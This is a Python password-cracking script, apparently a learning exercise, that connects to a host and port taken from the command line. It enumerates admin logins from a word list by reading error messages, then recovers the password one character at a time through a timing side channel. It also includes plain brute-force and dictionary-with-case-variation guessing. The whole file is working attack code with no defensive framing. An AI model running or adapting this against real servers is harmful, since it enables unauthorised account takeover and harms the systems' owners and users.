import socket
import sys
import itertools
import string
import json
import time

BUFFER_SIZE = 1024
client_socket = socket.socket()


def get_response_from_server(client_socket, data):
    client_socket.send(data.encode())
    response = client_socket.recv(BUFFER_SIZE).decode()
    return response


def generate_alphanum_combinations(sequence_length):
    alphanumeric_chars = list(string.ascii_lowercase + string.digits)
    return itertools.product(alphanumeric_chars, repeat=sequence_length)


def brute_force(client_socket):
    password_length = 1
    while 1:
        wannabe_passwords = generate_alphanum_combinations(password_length)
        for sequence_tuple in wannabe_passwords:
            sequence = ''.join(sequence_tuple)
            response = get_response_from_server(client_socket, sequence)
            if response == "Connection success!":
                return sequence
            elif response == "Too many attempts":
                return None
        password_length += 1


def guess_password_with_dictionary(client_socket):
    with open('passwords.txt', 'r') as dictionary:
        for word in dictionary:
            word = word.strip('\n')
            combinations = map(''.join,
                               itertools.product(*zip(word.upper(), word.lower())))
            for combination in combinations:
                response = get_response_from_server(client_socket, combination)
                if response == "Connection success!":
                    return combination
                elif response == "Too many attempts":
                    return None


def guess_admin_login(client_socket):
    with open('logins.txt', 'r') as logins:
        for login in logins:
            login = login.strip('\n')
            message = {"login": login, "password": ""}
            response = json.loads(get_response_from_server(client_socket, json.dumps(message)))
            if response["result"] == "Wrong password!":
                return login


def guess_admin_password(client_socket, login):
    alphanumeric_chars = list(string.ascii_letters + string.digits)
    password = ""
    while 1:
        for char in alphanumeric_chars:
            message = {"login": login, "password": f"{password}{char}"}
            start = time.perf_counter()
            response = json.loads(get_response_from_server(client_socket, json.dumps(message)))
            end = time.perf_counter()
            response_time = end - start
            if response_time > 0.05:
                password = f"{password}{char}"
            elif response["result"] == "Connection success!":
                password = f"{password}{char}"
                return password


def get_credentials(client_socket):
    login = guess_admin_login(client_socket)
    password = guess_admin_password(client_socket, login)
    credentials = {"login": login, "password": password}
    return json.dumps(credentials)


if __name__ == '__main__':
    address = (sys.argv[1], int(sys.argv[2]))
    client_socket.connect(address)
    credentials = get_credentials(client_socket)
    print(credentials)
    client_socket.close()
